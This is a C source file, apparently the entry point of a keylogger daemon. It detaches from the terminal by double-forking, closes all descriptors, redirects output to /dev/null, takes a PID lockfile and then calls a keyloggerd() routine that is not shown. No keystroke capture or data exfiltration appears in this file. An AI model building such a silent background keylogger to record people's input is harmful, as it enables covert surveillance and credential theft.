#include <errno.h>      /* for errno */
#include <fcntl.h>      /* for open */
#include <signal.h>     /* for sigaction */
#include <stdbool.h>    /* for bool */
#include <stdio.h>
#include <stdlib.h>     /* for exit  */
#include <string.h>     /* for strerror */
#include <sys/resource.h>   /* for getrlimit */
#include <sys/stat.h>   /* for mode_t */
#include <unistd.h>     /* for getpid */

#include "common.h"
#include "error.h"
#include "keyloggerd.h"

/* @todo set to /var/run/keyloggerd.pid when super user support is added */
#define LOCKFILE "keyloggerd.pid"

/**
 * Daemonize the process
 */
static void daemonize(void)
{
    logger.debug("Starting keylogger daemon...");
    logger.debug(cmd_args->prog_name);

    /*
     * Clear file creation mask and set it to a known value.
     */
    mode_t prev_umask, new_mask = 0;

    prev_umask = umask(new_mask);

    logger.debug("umask change: %03o -> %03o", prev_umask, new_mask);

    /*
     * Get the maximum number of file descriptors.
     */
    struct rlimit fd_limit;

    if (getrlimit(RLIMIT_NOFILE, &fd_limit) < 0) {
        err_quit("Cannot get file limit");
    }

    /*
     * Create a new session and become the session leader to lose controlling
     * TTY.
     *
     * A session is a collection ofone or more process groups. e.g. calling:
     * $ proc1 | proc2    # This is a process group consisting of proc1 and
     *                    # proc2
     *
     * Calling setsid() causes three things:
     * 1. The forked child process becomes a session leader.
     * 2. The process will become the process group leader of a new process
     *    group.
     * 3. The process has no controlling terminal (if it had one before the
     *    call, the association between it and the terminal is broken)
     */
    pid_t pid;

    logger.debug("Start [%d]", getpid());

    if ((pid = fork()) < 0) {
        err_quit("Cannot fork");
    } else if (pid != 0) { /* parent */
        logger.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
        exit(0);
    }

    setsid();

    /*
     * Ensure future opens won't allocate controlling TTYs. We must fork again!
     */
    struct sigaction sa;

    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    if (sigaction(SIGHUP, &sa, NULL) < 0) {
        err_quit("Cannot ignore SIGHUP");
    }

    if ((pid = fork()) < 0) {
        err_quit("Cannot fork");
    } else if (pid != 0) { /* parent */
        logger.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
        exit(0);
    }

    /*
     * The remaining code in a child process as a daemon. It owns no TTY.
     */

    /*
     * Change the current working directory to the root so we won't prevent file
     * systems from being unmounted.
     */
#if DEBUG
    char working_dir[80];
    getcwd(working_dir, 80);
#else
    char *working_dir = "/";
#endif
    if (chdir(working_dir) < 0) {
        err_quit("Cannot change directory to %s", working_dir);
    }

    logger.debug("Change working directory to %s", working_dir);

    /*
     * Close all open file descriptors
     */
    if (fd_limit.rlim_max == RLIM_INFINITY) {
        fd_limit.rlim_max = 1024;
    }

    for (int k = 0; k < fd_limit.rlim_max; k++) {
        close(k);
    }

    /*
     * Attach file descriptors 0, 1, and 2 (stdin/stdout/stderr) to /dev/null
     */
    int fd0, fd1, fd2;

    fd0 = open("/dev/null", O_RDWR);
    fd1 = dup(0);
    fd2 = dup(0);

    if (fd0 != STDIN_FILENO || fd1 != STDOUT_FILENO || fd2 != STDERR_FILENO) {
        err_quit("Unexpected file descriptors: %d %d %d", fd0, fd1, fd2);
    }

    logger.debug("File descriptors %d, %d, %d -> /dev/null", fd0, fd1, fd2);

    /* Daemon initialization is finished */
}

/**
 * Ensure that only one copy of the daemon is running
 */
static bool is_daemon_already_running(void)
{
    int fd;

    int oflag = O_RDWR | O_CREAT | O_TRUNC;
    mode_t mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;

    fd = open(LOCKFILE, oflag, mode);

    if (fd == ERROR) {
        logger.error("Failed to open %s: %s", LOCKFILE, strerror(errno));
        return true;
    }

    struct flock lockp = {
        .l_type = F_WRLCK,
        .l_whence = SEEK_CUR,
        .l_start = 0,
        .l_len = 16,
    };

    if (fcntl(fd, F_SETLK, &lockp) == ERROR) {
        logger.error("Failed to lock %s: %s", LOCKFILE, strerror(errno));
        return true;
    }

    char buf[16];
    sprintf(buf, "%ld", (long) getpid());
    write(fd, buf, strlen(buf)+1);

    return false;
}

int main(int argc, char *argv[])
{
    cmd_args = parse_args(argc, argv);

    if (cmd_args) {
        logger.open(cmd_args->prog_name);

        daemonize();

        if (is_daemon_already_running()) {
            err_quit("Aborting since daemon is already running");
        }

        keyloggerd();

        logger.info("Daemon finished");
        logger.close();
    }

    exit(0);
}
